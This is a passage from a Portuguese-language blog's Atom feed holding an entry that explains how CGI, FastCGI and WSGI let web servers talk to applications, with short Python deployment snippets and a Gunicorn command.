tornar este &lt;em&gt;post&lt;/em&gt; mais longo e vou parar por aqui.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="opiniao"></category><category term="python brasil"></category><category term="python"></category><category term="evento"></category></entry><entry><title>Entendendo o CGI, FastCGI e WSGI</title><link href="https://klauslaube.com.br/2012/11/02/entendendo-o-cgi-fastcgi-e-wsgi.html" rel="alternate"></link><published>2012-11-02T15:09:19-02:00</published><updated>2012-11-02T15:09:19-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-11-02:/2012/11/02/entendendo-o-cgi-fastcgi-e-wsgi.html</id><summary type="html">&lt;p&gt;Pelos vários anos que programei com o &lt;a href="https://klauslaube.com.br/tag/php.html" title="Conheça mais sobre o Hypertext PreProcessor"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt; e &lt;em&gt;Apache&lt;/em&gt;,
nunca precisei me preocupar com o que acontecia entre esses dois. Para
mim, era tudo uma “mágica” maravilhosa, que entregava as minhas páginas
&lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; de forma dinâmica. Era uma troca justa: Eles não me traziam
preocupação, logo, eu não me …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Pelos vários anos que programei com o &lt;a href="https://klauslaube.com.br/tag/php.html" title="Conheça mais sobre o Hypertext PreProcessor"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt; e &lt;em&gt;Apache&lt;/em&gt;,
nunca precisei me preocupar com o que acontecia entre esses dois. Para
mim, era tudo uma “mágica” maravilhosa, que entregava as minhas páginas
&lt;a href="https://klauslaube.com.br/tag/web.html" title="Leia mais sobre Web"&gt;&lt;em&gt;web&lt;/em&gt;&lt;/a&gt; de forma dinâmica. Era uma troca justa: Eles não me traziam
preocupação, logo, eu não me preocupava.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Com o passar do tempo, o uso do &lt;a href="https://klauslaube.com.br/2011/12/19/nginx-poderoso-rapido-facil.html" title="Conheça o Nginx"&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt; e a necessidade de aprender
&lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, comecei a me deparar com o famoso &lt;code&gt;cgi-bin&lt;/code&gt;, e
entender que os truques que o &lt;a href="http://stackoverflow.com/questions/2712825/what-is-mod-php" title="Não conhece o módulo do PHP para o Apache?"&gt;&lt;strong&gt;mod_php&lt;/strong&gt;&lt;/a&gt; ocultava iam muito além
do que eu imaginava.&lt;/p&gt;
&lt;h2&gt;O Common Gateway Interface&lt;/h2&gt;
&lt;p&gt;De um modo bem simples, podemos dizer que o &lt;em&gt;Common Gateway Interface&lt;/em&gt; é
um “acordo” entre os servidores &lt;a href="https://klauslaube.com.br/tag/http.html" title="Leia mais sobre HTTP"&gt;&lt;em&gt;HTTP&lt;/em&gt;&lt;/a&gt; e as aplicações &lt;em&gt;web&lt;/em&gt;. Por
baixo dos panos, o servidor &lt;em&gt;web&lt;/em&gt; vai informar uma série de parâmetros
para o seu programa, e é dever do seu programa entregar uma resposta
“bem formada” para o servidor &lt;em&gt;web&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Isso quer dizer que, para o &lt;em&gt;CGI&lt;/em&gt;, não importa qual linguagem ou banco
de dados o seu programa está usando. Para ele, importa a passagem dos
parâmetros e a resposta. Logo, é perfeitamente possível desenvolvermos
nossas páginas até mesmo com a linguagem &lt;em&gt;C&lt;/em&gt;:&lt;/p&gt;
&lt;script src="https://gist.github.com/3734844.js?file=main.c"&gt;&lt;/script&gt;

&lt;noscript&gt;
[Veja o exemplo][].
&lt;/noscript&gt;

&lt;p&gt;Basta compilar o código acima, jogar no &lt;code&gt;cgi-bin&lt;/code&gt; do seu &lt;em&gt;Apache&lt;/em&gt;, e
você verá a flexibilidade do protocolo em ação. Neste exemplo, acessando
nosso programa através da &lt;em&gt;URL&lt;/em&gt; &lt;code&gt;http://localhost/cgi-bin/exemplo?red&lt;/code&gt;
(por exemplo), veremos apenas uma página com o fundo vermelho. Mas é
importante reparar que, o parâmetro passado na URL (&lt;code&gt;?red&lt;/code&gt;) está acessível através do
&lt;code&gt;argv&lt;/code&gt;, ou seja, o protocolo está passando para o nosso programa os
parâmetros através da &lt;code&gt;STDIN&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Através da &lt;code&gt;STDOUT&lt;/code&gt;, estamos respondendo ao &lt;em&gt;Apache&lt;/em&gt; utilizando de
artifícios do protocolo. A nossa mensagem é composta por um cabeçalho
informando o tipo da mensagem e o conteúdo. Neste exemplo, trata-se de
um &lt;em&gt;HTML&lt;/em&gt; extremamente simples, &lt;em&gt;James Marshall&lt;/em&gt; &lt;a href="http://www.jmarshall.com/easy/cgi/portuguese/getcgi.c.txt" title="Veja outro exemplo de C com CGI"&gt;escreveu um bom exemplo um pouco mais complexo utilizando a linguagem &lt;em&gt;C&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Outro comportamento fundamental do &lt;em&gt;CGI&lt;/em&gt; é a criação de variáveis de
ambiente. Variáveis que você já deve ter usado, como &lt;code&gt;REMOTE_HOST&lt;/code&gt;,
&lt;code&gt;REMOTE_ADDR&lt;/code&gt;, &lt;code&gt;REQUEST_METHOD&lt;/code&gt; e &lt;code&gt;QUERY_STRING&lt;/code&gt;, são
preenchidas pelo servidor &lt;em&gt;Web&lt;/em&gt; e passadas ao seu programa através do
protocolo:&lt;/p&gt;
&lt;script src="https://gist.github.com/3734844.js?file=vars.c"&gt;&lt;/script&gt;

&lt;noscript&gt;
[Veja o exemplo][1].
&lt;/noscript&gt;

&lt;h2&gt;O FastCGI&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;FastCGI&lt;/em&gt; segue o mesmo princípio do &lt;em&gt;CGI&lt;/em&gt;, mas possui uma série de
particularidades (e vantagens) em relação ao seu “primogênito”. Para
compreender a diferença entre eles, vamos analisar o ciclo de vida de
uma requisição utilizando o &lt;em&gt;CGI&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A cada requisição, o servidor &lt;em&gt;web&lt;/em&gt; &lt;strong&gt;cria um novo processo&lt;/strong&gt;;&lt;/li&gt;
&lt;li&gt;Através deste processo, o servidor &lt;em&gt;web&lt;/em&gt; passa informações para o
  “programa &lt;em&gt;CGI&lt;/em&gt;“ utilizando &lt;strong&gt;variáveis de ambiente&lt;/strong&gt;;&lt;/li&gt;
&lt;li&gt;O servidor &lt;em&gt;web&lt;/em&gt; também passa qualquer &lt;em&gt;input&lt;/em&gt; de dados do usuário
  através da &lt;strong&gt;&lt;em&gt;STDIN&lt;/em&gt;&lt;/strong&gt;;&lt;/li&gt;
&lt;li&gt;O programa retorna uma saída ao servidor &lt;em&gt;web&lt;/em&gt; através do protocolo
  &lt;em&gt;CGI&lt;/em&gt; (utilizando a &lt;strong&gt;&lt;em&gt;STDOUT&lt;/em&gt;&lt;/strong&gt;);&lt;/li&gt;
&lt;li&gt;Quando o &lt;strong&gt;programa acabar&lt;/strong&gt;, a requisição é finalizada.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Em um cenário com poucas requisições, este fluxo atende perfeitamente.
Os problemas começam a aparecer quando temos que lidar com &lt;strong&gt;alto
consumo&lt;/strong&gt; (algo comum hoje em dia, mas nem tão comum quando conceberam o
protocolo &lt;em&gt;CGI&lt;/em&gt;). Dentre os principais problemas, temos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Criar e destruir um processo a cada requisição aumenta o &lt;em&gt;load&lt;/em&gt; do
  seu servidor, o que fatalmente degrada performance;&lt;/li&gt;
&lt;li&gt;Não há reúso de recursos, como conexões com banco de dados e
  &lt;em&gt;caches&lt;/em&gt; em memória (já que a cada nova requisição é iniciado um
  novo processo);&lt;/li&gt;
&lt;li&gt;Não é trivial separar a sua aplicação do seu servidor &lt;em&gt;Web&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Foi pensando em performance e escalabilidade que o &lt;em&gt;FastCGI&lt;/em&gt; foi criado.
Ao contrário do &lt;em&gt;CGI&lt;/em&gt;, ele utiliza “processos persistentes”, onde o
servidor &lt;em&gt;web&lt;/em&gt; é capaz de iniciar um processo que responde a uma série
de requisições. Além disso, ele usa &lt;a href="http://pt.wikipedia.org/wiki/Multiplexador" title="Leia mais sobre Multiplexadores na Wikipedia"&gt;multiplexação&lt;/a&gt; para transmitir e
receber informações dentro de uma única conexão, que pode ser um
&lt;em&gt;socket&lt;/em&gt; ou uma conexão &lt;em&gt;TCP&lt;/em&gt;. Desse modo, você pode ter o seu servidor
&lt;em&gt;web&lt;/em&gt; e o seu processo &lt;em&gt;FastCGI&lt;/em&gt; em máquinas diferentes.&lt;/p&gt;
&lt;p&gt;O ciclo de vida de uma requisição &lt;em&gt;FastCGI&lt;/em&gt;, é basicamente composto por:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;O servidor &lt;em&gt;web&lt;/em&gt; &lt;strong&gt;cria um processo &lt;em&gt;FastCGI&lt;/em&gt;&lt;/strong&gt; para receber
  requisições;&lt;/li&gt;
&lt;li&gt;A sua aplicação é inicializada, e &lt;strong&gt;aguarda por uma nova conexão&lt;/strong&gt;
  vinda do servidor &lt;em&gt;web&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;Quando o cliente envia uma requisição, o servidor &lt;em&gt;web&lt;/em&gt; abre uma
  &lt;strong&gt;conexão com o processo &lt;em&gt;FastCGI&lt;/em&gt;&lt;/strong&gt;. O servidor envia as variáveis
  de ambiente e entradas de dados através desta conexão;&lt;/li&gt;
&lt;li&gt;O processo &lt;em&gt;FastCGI&lt;/em&gt; retorna a &lt;strong&gt;saída através desta mesma
  conexão&lt;/strong&gt;;&lt;/li&gt;
&lt;li&gt;O processo &lt;em&gt;FastCGI&lt;/em&gt; fecha a conexão, e a &lt;strong&gt;requisição é
  concluída&lt;/strong&gt;, porém, o &lt;strong&gt;processo fica “vivo”&lt;/strong&gt;, esperando por outra
  requisição do servidor &lt;em&gt;web&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;É claro que para atingir este resultado, aplicações &lt;em&gt;FastCGI&lt;/em&gt; possuem
uma arquitetura mais “rebuscada” que aplicações &lt;em&gt;CGI&lt;/em&gt;. Por exemplo, para
suportar a &lt;a href="http://www.nongnu.org/fastcgi/#multiplexing" title="The wonders of multiplexing"&gt;multiplexação&lt;/a&gt;, o servidor &lt;em&gt;web&lt;/em&gt; e o processo &lt;em&gt;FastCGI&lt;/em&gt;
se comunicam através de mensagens. Nestas mensagens (&lt;code&gt;BEGIN_REQUEST&lt;/code&gt;,
&lt;code&gt;ABORT_REQUEST&lt;/code&gt;, &lt;code&gt;END_REQUEST&lt;/code&gt;, &lt;code&gt;PARAMS&lt;/code&gt;, &lt;code&gt;STDIN&lt;/code&gt; e
&lt;code&gt;STDOUT&lt;/code&gt;) possuímos um cabeçalho chamado &lt;code&gt;Request ID&lt;/code&gt;, que é
responsável por identificar a qual requisição o pacote pertence.&lt;/p&gt;
&lt;p&gt;Essa mudança de arquitetura acaba influenciando na escrita das
aplicações &lt;em&gt;web&lt;/em&gt;, trazendo alterações marcantes em comparação aos
programas escritos para o bom e velho &lt;em&gt;CGI&lt;/em&gt;. Por exemplo, você terá que
&lt;a href="http://redmine.lighttpd.net/projects/1/wiki/Docs_ModFastCGI#FastCGI-and-Programming-Languages" title="Lighttp - the FastCGI Interface"&gt;recompilar o seu &lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt; com a &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;—enable-fast-cgi&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;O site oficial do &lt;em&gt;FastCGI&lt;/em&gt; possui um bom exemplo de implementação de
uma &lt;a href="http://www.fastcgi.com/devkit/doc/fastcgi-prog-guide/ch2c.htm" title="Developing FastCGI Applications in C"&gt;aplicação em &lt;em&gt;C&lt;/em&gt; com &lt;em&gt;FastCGI&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;O Web Server Gateway Interface&lt;/h2&gt;
&lt;p&gt;No universo &lt;em&gt;Python&lt;/em&gt; começaram a aparecer diferentes formas de
comunicação entre servidor e aplicação, seja com &lt;em&gt;CGI&lt;/em&gt;, &lt;em&gt;FastCGI&lt;/em&gt;, &lt;a href="http://www.modpython.org/" title="Leia mais sobre o mod_python"&gt;&lt;em&gt;mod
python&lt;/em&gt;&lt;/a&gt; ou até mesmo com &lt;em&gt;APIs&lt;/em&gt; próprias e não padronizadas. Isso
acarretou no seguinte cenário: A escolha de um &lt;em&gt;framework&lt;/em&gt; influenciava
diretamente na escolha do servidor &lt;em&gt;web&lt;/em&gt;, e geralmente o &lt;em&gt;framework&lt;/em&gt;
escolhido era “incompatível” com os demais disponíveis para uso.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;WSGI&lt;/em&gt; é uma &lt;a href="http://www.python.org/dev/peps/pep-0333/" title="Leia a PEP 333, especificação do WSGI"&gt;especificação&lt;/a&gt; que tem por objetivo garantir que o
desenvolvedor da aplicação não se preocupe com qual servidor &lt;em&gt;web&lt;/em&gt; será
escolhido, bem como o profissional responsável pelo servidor &lt;em&gt;web&lt;/em&gt; não
se preocupe com a arquitetura escolhida pela aplicação. Uma forma
“universal” de proporcionar interoperabilidade entre servidores e
aplicações escritas em &lt;em&gt;Python&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Veja um exemplo de &lt;em&gt;script Python&lt;/em&gt; utilizando o protocolo &lt;em&gt;CGI&lt;/em&gt;:&lt;/p&gt;
&lt;script src="https://gist.github.com/3734844.js?file=main.py"&gt;&lt;/script&gt;

&lt;noscript&gt;
[Veja o exemplo][3].
&lt;/noscript&gt;

&lt;p&gt;Seguindo a especificação do &lt;em&gt;WSGI&lt;/em&gt;, devemos servir nossa aplicação da
seguinte maneira:&lt;/p&gt;
&lt;script src="https://gist.github.com/3734844.js?file=wsgi.py"&gt;&lt;/script&gt;

&lt;noscript&gt;
[Veja o exemplo][4].
&lt;/noscript&gt;

&lt;p&gt;Encapsulamos a nossa entrega em uma função chamada &lt;code&gt;application&lt;/code&gt;, e
nela possuímos dois parâmetros: &lt;code&gt;environ&lt;/code&gt; e &lt;code&gt;start_response&lt;/code&gt;. O
primeiro é responsável por informar quais as variáveis ambientais que
temos à nossa disposição. O segundo, nomeado como &lt;code&gt;start_response&lt;/code&gt;, é
na verdade uma função de &lt;em&gt;callback&lt;/em&gt; onde informamos o &lt;em&gt;status code&lt;/em&gt; e
demais cabeçalhos para resposta.&lt;/p&gt;
&lt;p&gt;Por fim, retornamos ao servidor &lt;em&gt;web&lt;/em&gt; o nosso &lt;a href="https://klauslaube.com.br/tag/html.html" title="Leia mais sobre HTML"&gt;&lt;em&gt;HTML&lt;/em&gt;&lt;/a&gt;. O servidor
&lt;em&gt;web&lt;/em&gt; pode “iterar” sobre a aplicação, retornando conteúdo ao usuário
conforme a aplicação for retornando conteúdo para ele. Neste caso,
utilizamos na resposta um tipo &lt;a href="http://docs.python.org/2/library/stdtypes.html#sequence-types-str-unicode-list-tuple-bytearray-buffer-xrange" title="Leia sobre tipos sequenciais no Python"&gt;sequencial&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Agora somos capazes de servir a aplicação através de &lt;em&gt;CGI&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;wsgiref.handlers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;CGIHandler&lt;/span&gt;

&lt;span class="n"&gt;CGIHandler&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E até mesmo &lt;em&gt;FastCGI&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;flup.server.fcgi&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;WSGIServer&lt;/span&gt;

&lt;span class="n"&gt;WSGIServer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;application&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A biblioteca &lt;a href="http://docs.python.org/2/library/wsgiref.html" title="Saiba mais direto da documentação do Python"&gt;&lt;em&gt;wsgiref&lt;/em&gt;&lt;/a&gt; implementa as especificações do &lt;em&gt;WSGI&lt;/em&gt; e
provê ferramentas para a comunicação entre servidores e aplicações. No
segundo exemplo utilizamos a &lt;a href="http://trac.saddi.com/flup" title="Saiba mais sobre"&gt;&lt;em&gt;flup&lt;/em&gt;&lt;/a&gt;, uma biblioteca com algumas
soluções &lt;em&gt;WSGI&lt;/em&gt;, incluindo a possibilidade de servir aplicações
&lt;em&gt;FastCGI&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Com esse “código de cola”, basta &lt;a href="http://docs.python.org/2/howto/webservers.html" title="HOWTO Use Python in the web"&gt;configurar o seu servidor &lt;em&gt;Web&lt;/em&gt;&lt;/a&gt;
favorito para servir a sua aplicação.&lt;/p&gt;
&lt;h3&gt;mod_wsgi&lt;/h3&gt;
&lt;p&gt;Uma vez construída a interface para a sua aplicação através do padrão
&lt;em&gt;WSGI&lt;/em&gt;, você pode serví-la em um servidor &lt;em&gt;Apache&lt;/em&gt; através do
&lt;a href="http://code.google.com/p/modwsgi/" title="Página do módulo no Google Code"&gt;mod_wsgi&lt;/a&gt;. Existem soluções equivalentes para outros servidores,
como por exemplo, no &lt;a href="http://klauslaube.com.br/tags/nginx/" title="Leia mais sobre Nginx"&gt;&lt;em&gt;Nginx&lt;/em&gt;&lt;/a&gt; temos o &lt;a href="http://wiki.nginx.org/NgxWSGIModule" title="Veja mais na documentação do Nginx"&gt;&lt;em&gt;NgxWSGIModule&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Com o &lt;em&gt;mod_wsgi&lt;/em&gt;, você não precisa de nenhum “código de cola” (como
apresentado nos exemplos de &lt;em&gt;CGI&lt;/em&gt; e &lt;em&gt;FastCGI&lt;/em&gt;), basta &lt;a href="http://code.google.com/p/modwsgi/wiki/QuickConfigurationGuide" title="Veja instruções para configurar o Apache com mod_wsgi"&gt;configurar o seu &lt;em&gt;Apache&lt;/em&gt;&lt;/a&gt;
e apontar o seu script &lt;em&gt;WSGI&lt;/em&gt; através da instrução &lt;code&gt;WSGIScriptAlias&lt;/code&gt;:&lt;/p&gt;
&lt;script src="https://gist.github.com/3734844.js?file=http_mod_wsgi.conf"&gt;&lt;/script&gt;

&lt;noscript&gt;
[Veja o exemplo][6].
&lt;/noscript&gt;

&lt;p&gt;Uma particularidade do mod_wsgi é a escolha de execução no modo
&lt;code&gt;daemon&lt;/code&gt;, que opera de uma forma &lt;a href="http://code.google.com/p/modwsgi/#Server_Performance" title="Leia mais sobre performance com mod_wsgi"&gt;similar ao esquema utilizado pelo
&lt;em&gt;FastCGI&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;Servidores WSGI&lt;/h3&gt;
&lt;p&gt;Você pode utilizar servidores especialmente escritos para servir as suas
aplicações &lt;em&gt;WSGI&lt;/em&gt;, como por exemplo o &lt;a href="http://gunicorn.org/" title="Veja mais sobre este servidor WSGI"&gt;&lt;em&gt;Gunicorn&lt;/em&gt;&lt;/a&gt;, o &lt;a href="http://projects.unbit.it/uwsgi/" title="Um rápido servidor WSGI escrito em C"&gt;&lt;em&gt;uWSGI&lt;/em&gt;&lt;/a&gt; ou
até mesmo o &lt;a href="http://www.tornadoweb.org/documentation/wsgi.html" title="Saiba mais sobre o suporte do Tornado ao WSGI"&gt;&lt;em&gt;Tornado&lt;/em&gt;&lt;/a&gt;. Além da versatilidade e performance, a
facilidade é outra característica marcante em muitas dessas ferramentas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gunicorn -w &lt;span class="m"&gt;4&lt;/span&gt; -b &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:5000 wsgi:application
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;No exemplo acima, levantamos o &lt;em&gt;Gunicorn&lt;/em&gt; na &lt;code&gt;porta 5000&lt;/code&gt;, e
reservamos &lt;code&gt;4 workers&lt;/code&gt; para servir a nossa aplicação.&lt;/p&gt;
&lt;p&gt;Além de diminuirmos a carga do servidor &lt;em&gt;web&lt;/em&gt;, e ganharmos um controle
mais apurado de memória e processos, ganhamos também o uso de &lt;em&gt;workers&lt;/em&gt;.
Por exemplo, o &lt;em&gt;Gunicorn&lt;/em&gt; trabalha com &lt;em&gt;pre-fork&lt;/em&gt; de &lt;em&gt;workers&lt;/em&gt;, onde um
processo “master” gerencia um conjunto de processos que são de fato os
responsáveis por servir a sua aplicação. Ganhamos mais uma ferramenta de
baixo custo para lidar com concorrência.&lt;/p&gt;
&lt;p&gt;Servidores &lt;em&gt;WSGI&lt;/em&gt; conseguem servir as aplicações sem o auxílio de um
&lt;em&gt;Apache&lt;/em&gt; ou &lt;em&gt;Nginx&lt;/em&gt;, mas uma prática muito comum hoje em dia é, “na
frente” de um &lt;em&gt;Gunicorn&lt;/em&gt; (por exemplo), termos um &lt;em&gt;Nginx&lt;/em&gt; servindo
estáticos, fazendo &lt;em&gt;caching&lt;/em&gt; e “aguentando porrada”, enquanto que o
servidor &lt;em&gt;WSGI&lt;/em&gt; está totalmente focado em servir o conteúdo dinâmico. O
servidor &lt;em&gt;web&lt;/em&gt; acaba fazendo uma espécie de &lt;a href="http://pt.wikipedia.org/wiki/Proxy_reverso" title="Leia mais sobre Proxy Reverso na Wikipedia"&gt;&lt;em&gt;proxy&lt;/em&gt; reverso&lt;/a&gt; e até
mesmo servindo como &lt;a href="http://wiki.nginx.org/LoadBalanceExample" title="Veja exemplo de uso do Nginx como balanceador"&gt;balanceador&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;A comunicação entre servidores pode ser feita via &lt;em&gt;TCP&lt;/em&gt; ou &lt;em&gt;socket&lt;/em&gt;.
Isso nos dá uma série de vantagens, que vão desde a facilidade em
&lt;a href="http://docs.gunicorn.org/en/latest/design.html#how-many-workers" title="Veja como utilizar workers com Gunicorn"&gt;escalar&lt;/a&gt; e distribuir, até o &lt;em&gt;restart&lt;/em&gt; individual de serviços (por
exemplo, se a sua aplicação travar, você pode reiniciar apenas o
servidor &lt;em&gt;WSGI&lt;/em&gt; e não perder o &lt;em&gt;caching&lt;/em&gt; do servidor &lt;em&gt;web&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Um exemplo muito interessante de uso de servidores &lt;em&gt;WSGI&lt;/em&gt; é fazendo
&lt;a href="https://devcenter.heroku.com/articles/python#using-a-different-wsgi-server" title="Using a different WSGI server - Heroku"&gt;&lt;em&gt;deploy&lt;/em&gt; de aplicações &lt;em&gt;Python&lt;/em&gt; para o &lt;em&gt;Heroku&lt;/em&gt;&lt;/a&gt;. Configurar um
servidor &lt;a href="http://mirobetm.blogspot.com.br/2012/03/ive-been-lighttpd-fastcgi-django-user.html" title="Gunicorn + Nginx - a much better way to deploy your Django website"&gt;&lt;em&gt;Nginx&lt;/em&gt; para se comunicar com servidores &lt;em&gt;WSGI&lt;/em&gt;&lt;/a&gt; também é
relativamente simples.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Um assunto muito interessante e que pretendo explorar mais aqui no
&lt;em&gt;blog&lt;/em&gt;, principalmente em relação a processos e &lt;em&gt;workers&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Servir aplicações &lt;em&gt;Python&lt;/em&gt; para a &lt;em&gt;web&lt;/em&gt; é algo relativamente simples,
limpo e elegante. Através do &lt;em&gt;WSGI&lt;/em&gt;, escalar aplicações passou a ser
algo quase trivial, que demanda pouco esforço. Combiná-los com o &lt;em&gt;Nginx&lt;/em&gt;
dão mais fôlego a sua aplicação (principalmente se estivermos falando do
&lt;em&gt;uWSGI&lt;/em&gt; ou &lt;a href="http://www.gevent.org/gevent.wsgi.html" title="Servindo aplicações WSGI com gevent"&gt;&lt;em&gt;gevent&lt;/em&gt;&lt;/a&gt;), e com um &lt;a href="http://puppetlabs.com/" title="IT Automation Software for System Administrators"&gt;sistema de provisionamento automático&lt;/a&gt;
podem facilitar e muito o seu trabalho de infraestrutura quando o consumo se tornar um problema.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.djangoproject.com/en/dev/howto/deployment/fastcgi/" title="Exemplo de uso do Django com FastCGI"&gt;&lt;em&gt;Django Documentation – How to use Django with FastCGI, SCGI, or AJP&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.nongnu.org/fastcgi/" title="Material muito interessante sobre o protocolo FastCGI e seu uso com C++"&gt;&lt;em&gt;FastCGI – The Forgotten Treasure&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.fastcgi.com/drupal/node/6?q=node/15" title="Um documento bem objetivo, detalhando os diferenciais em usar o FastCGI"&gt;&lt;em&gt;FastCGI – A High-Performance Web Server Interface&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://gunicorn.org/" title="Conheça o Gunicorn e descubra as vatangens de possuir um servidor WSGI"&gt;&lt;em&gt;Gunicorn – Python WSGI HTTP Server for Unix&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.irt.org/articles/js172/" title="Artigo de 1999 detalhando algumas características do CGI e do FastCGI"&gt;&lt;em&gt;irt.org – Speed Thrills: CGI Please... and Fast!&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.jmarshall.com/easy/cgi/portuguese/" title="Bom artigo, resumindo muito bem o funcionamento do CGI"&gt;&lt;em&gt;James Marshal&lt;/em&gt; – &lt;em&gt;CGI&lt;/em&gt; realmente fácil&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://code.google.com/p/modwsgi/" title="Veja a página oficial do projeto"&gt;&lt;em&gt;modwsgi – Python WSGI adapter module for Apache&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.python.org/dev/peps/pep-0333/" title="Leia a especificação direto do portal da linguagem Python"&gt;&lt;em&gt;PEP 333 – Python Web Server Gateway Interface&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.python.org/howto/webservers.html" title="Compreenda a diferença do uso do Python com CGI, FastCGI, mod_python, mod_wsgi e servidores WSGI"&gt;&lt;em&gt;Python Documentation – HOWTO Use Python in the web&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.w3.org/CGI/" title="Leia mais sobre a especificação do CGI"&gt;&lt;em&gt;W3C – Common Gateway Interface&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Common_Gateway_Interface" title="Leia mais no artigo da Wikipedia"&gt;&lt;em&gt;Wikipedia – Common Gateway Interface&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/FastCGI" title="Leia mais no artigo da Wikipedia"&gt;&lt;em&gt;Wikipedia – FastCGI&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://en.wikipedia.org/wiki/Web_Server_Gateway_Interface" title="Leia mais no artigo da Wikipedia"&gt;&lt;em&gt;Wikipedia – Web Server Gateway Interface&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.xml.com/pub/a/2006/09/27/introducing-wsgi-pythons-secret-web-weapon.html" title="Artigo de 2006 explicando os principais benefícios do uso do WSGI"&gt;&lt;em&gt;XML.com – Introducing WSGI: Python’s Secret Web Weapon&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
